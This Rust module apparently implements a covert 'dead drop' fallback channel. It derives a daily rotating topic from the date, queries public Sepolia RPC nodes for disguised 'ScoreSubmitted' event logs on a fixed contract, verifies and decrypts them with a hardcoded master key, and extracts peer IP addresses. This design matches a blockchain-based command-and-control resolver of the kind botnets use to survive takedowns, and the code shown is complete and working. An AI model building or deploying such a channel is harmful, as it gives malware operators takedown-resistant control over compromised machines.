use std::error::Error;
use std::time::{SystemTime, UNIX_EPOCH};
use reqwest::Client;
use serde::{Deserialize, Serialize};
use log::{info, warn, debug};
use ed25519_dalek::{Verifier, VerifyingKey, Signature};
use chacha20poly1305::{ChaCha20Poly1305, Key, Nonce}; // Removed Aead from root
use chacha20poly1305::aead::{Aead, KeyInit}; // Import Aead trait here

// --- CONFIGURATION ---
const RPC_ENDPOINTS: &[&str] = &[
    "https://rpc.sepolia.org",
    "https://ethereum-sepolia-rpc.publicnode.com",
    "https://1rpc.io/sepolia",
    "https://rpc2.sepolia.org"
];

// Contract Address (Deployed by User)
const CONTRACT_ADDR: &str = "0x8A58Da9B24C24b9D6Faf2118eB3845FE7D4b13c5"; 
// Event: ScoreSubmitted(uint256 indexed magic_id, bytes payload)
// Topic0 = Keccak256("ScoreSubmitted(uint256,bytes)")
const EVENT_TOPIC_0: &str = "0xf5b2b2c9d749171f81d11324706509c313da5e730b72f44f535144b621404179"; // PRE-CALCULATED

// Master Public Key (32 bytes)
const MASTER_PUB_KEY: [u8; 32] = [
    0x75, 0xbf, 0x34, 0x60, 0xf7, 0x00, 0x57, 0x06, 
    0xa3, 0x82, 0x85, 0x4d, 0x0b, 0x31, 0xc7, 0x63, 
    0x30, 0x4d, 0x15, 0x19, 0x18, 0xd1, 0xca, 0x87, 
    0xe7, 0x38, 0x99, 0xcc, 0x79, 0x3d, 0xb8, 0x6a
];

// Shared Key for ChaCha20 (Derived from Master Public Key using HKDF)
// In production, this should use ECDH for perfect forward secrecy.
// For dead drop recovery, we derive a deterministic key from the master.
fn derive_fallback_key() -> [u8; 32] {
    use sha2::{Sha256, Digest};
    
    // HKDF-like derivation: key = SHA256(MASTER_PUB_KEY || "phantom-fallback-v1")
    let mut hasher = Sha256::new();
    hasher.update(&MASTER_PUB_KEY);
    hasher.update(b"phantom-fallback-v1");
    let result = hasher.finalize();
    
    let mut key = [0u8; 32];
    key.copy_from_slice(&result);
    key
}

#[derive(Serialize)]
struct RpcRequest {
    jsonrpc: String,
    method: String,
    params: Vec<serde_json::Value>,
    id: u32,
}

#[derive(Deserialize, Debug)]
struct RpcResponse {
    result: Option<Vec<LogEntry>>,
    error: Option<serde_json::Value>,
}

#[derive(Deserialize, Debug)]
struct LogEntry {
    topics: Vec<String>, // [Topic0, Topic1(magic_id)]
    data: String,        // Payload (Hex)
    #[serde(rename = "blockNumber")]
    block_number: String,
}

fn get_daily_magic() -> String {
    let start = SystemTime::now();
    let since_the_epoch = start.duration_since(UNIX_EPOCH).expect("Time went backwards");
    let day_slot = since_the_epoch.as_secs() / 86400;
    
    // Hash (Day ^ Seed)
    let seed: u64 = 0x36A5EC9D09C60386;
    let mut state = day_slot ^ seed;
    state ^= state << 13;
    state ^= state >> 7;
    state ^= state << 17;
    
    // Convert to uint256 hex string (padded)
    // Magic ID is uint256 in Solidity, so Topic is 32 bytes.
    // We use the 64-bit state as the value.
    // Format: 0x000...000<state_hex>
    format!("0x{:064x}", state)
}

pub async fn check_sepolia_fallback() -> Option<(Vec<(String, u16)>, Vec<u8>)> {
    let magic_topic = get_daily_magic();
    info!("[Sepolia] Checking Fallback channel. Magic: {}...", &magic_topic[0..10]);
    
    let client = Client::builder()
        .timeout(std::time::Duration::from_secs(10))
        .build()
        .unwrap();

    // 1. RPC Rotation
    for endpoint in RPC_ENDPOINTS {
        debug!("[Sepolia] Checking RPC: {}", endpoint);
        match fetch_logs(&client, endpoint, &magic_topic).await {
            Ok(logs) => {
                if logs.is_empty() { continue; } 
                
                let count = logs.len();
                let start_idx = if count > 5 { count - 5 } else { 0 };
                
                info!("[Sepolia] Found {} logs. Processing last {}...", count, count - start_idx);
                
                for log in logs.iter().skip(start_idx).rev() { // Reverse: Newest first
                    if let Some((peers, blob)) = try_decrypt_payload(&log.data) {
                         info!("[Sepolia] Successfully recovered valid peers from Log");
                         return Some((peers, blob));
                    }
                }
                warn!("[Sepolia] All logs were invalid or failed signature check.");
            }
            Err(e) => warn!("[Sepolia] RPC {} Failed: {}", endpoint, e),
        }
    }
    None
}

async fn fetch_logs(client: &Client, url: &str, topic: &str) -> Result<Vec<LogEntry>, Box<dyn Error>> {
    // First, get current block number
    let block_req = serde_json::json!({
        "jsonrpc": "2.0",
        "method": "eth_blockNumber",
        "params": [],
        "id": 0
    });
    
    let block_resp = client.post(url).json(&block_req).send().await?;
    let block_json: serde_json::Value = block_resp.json().await?;
    let current_block = block_json["result"].as_str().unwrap_or("0x0");
    
    // Calculate fromBlock (current - 45000 to stay under 50k limit)
    let current_num = u64::from_str_radix(current_block.trim_start_matches("0x"), 16).unwrap_or(0);
    let from_block = if current_num > 45000 { current_num - 45000 } else { 0 };
    let from_hex = format!("0x{:x}", from_block);
    
    let payload = serde_json::json!({
        "jsonrpc": "2.0",
        "method": "eth_getLogs",
        "params": [{
            "address": CONTRACT_ADDR,
            "topics": [EVENT_TOPIC_0, topic], // Filter by Daily Magic
            "fromBlock": from_hex,
            "toBlock": "latest"
        }],
        "id": 1
    });

    let resp = client.post(url).json(&payload).send().await?;
    let rpc_res: RpcResponse = resp.json().await?;
    
    if let Some(err) = rpc_res.error {
        return Err(format!("RPC Error: {:?}", err).into());
    }
    
    Ok(rpc_res.result.unwrap_or_default())
}

fn try_decrypt_payload(hex_data: &str) -> Option<(Vec<(String, u16)>, Vec<u8>)> {
    // 1. Decode Hex
    let clean_hex = hex_data.trim_start_matches("0x");
    let bytes = hex::decode(clean_hex).ok()?;
    
    // Encrypted Packet Structure: [Magic(4)][IV(12)][Data(N)][OuterSig(64)]
    if bytes.len() < 81 { return None; }
    
    let iv_slice = &bytes[4..16];
    let sig_slice = &bytes[bytes.len()-64..]; 
    let encrypted_data = &bytes[16..bytes.len()-64];
    
    // 2. Verify Outer Signature (Anti-DoS)
    // Msg = [Magic(4) + IV(12) + EncryptedData]
    let signed_len = bytes.len() - 64;
    let signed_msg = &bytes[0..signed_len];
    
    let vk = VerifyingKey::from_bytes(&MASTER_PUB_KEY).ok()?;
    let signature = Signature::from_bytes(sig_slice.try_into().ok()?);
    
    if vk.verify(signed_msg, &signature).is_err() {
        // debug!("[Sepolia] Invalid Outer Signature in Log");
        return None;
    }
    
    // 3. Decrypt
    let cipher = ChaCha20Poly1305::new(Key::from_slice(&derive_fallback_key()));
    let nonce = Nonce::from_slice(iv_slice);
    
    match cipher.decrypt(nonce, encrypted_data) {
        Ok(plaintext) => {
            // Plaintext MUST be the WireSignedConfigUpdate struct
            // Layout: [Magic(4)][Time(8)][Ver(4)][Len(1)][IP(64)][Sig(64)] = 145 bytes
            if plaintext.len() < 145 {
                return None;
            }
            
            // Check Inner Magic (0x52224AC4)
            let magic_bytes: [u8; 4] = plaintext[0..4].try_into().ok()?;
            if u32::from_le_bytes(magic_bytes) != 0x52224AC4 && u32::from_be_bytes(magic_bytes) != 0x52224AC4 {
                 // Try both endians just in case, but protocol says 0x52224AC4 literal
                 return None;
            }

            // Extract New IP
            let ip_len = plaintext[16];
            let ip_bytes = &plaintext[17..17+64];
            let safe_len = std::cmp::min(ip_len as usize, 64);
            let ip_str = String::from_utf8_lossy(&ip_bytes[0..safe_len]).to_string();
            
            // Parse IP
            if let Some(peers) = parse_peers(&ip_str) {
                return Some((peers, plaintext));
            }
            None
        },
        Err(_) => None 
    }
}

fn parse_peers(text: &str) -> Option<Vec<(String, u16)>> {
    let mut peers = Vec::new();
    // Support "IP:Port" or "IP:Port;IP:Port"
    // Also remove null bytes
    let clean_text = text.trim_matches(char::from(0));
    
    for part in clean_text.split(';') {
        if let Some((ip, port_str)) = part.split_once(':') {
            if let Ok(port) = port_str.parse::<u16>() {
                peers.push((ip.to_string(), port));
            }
        }
    }
    if peers.is_empty() { None } else { Some(peers) }
}
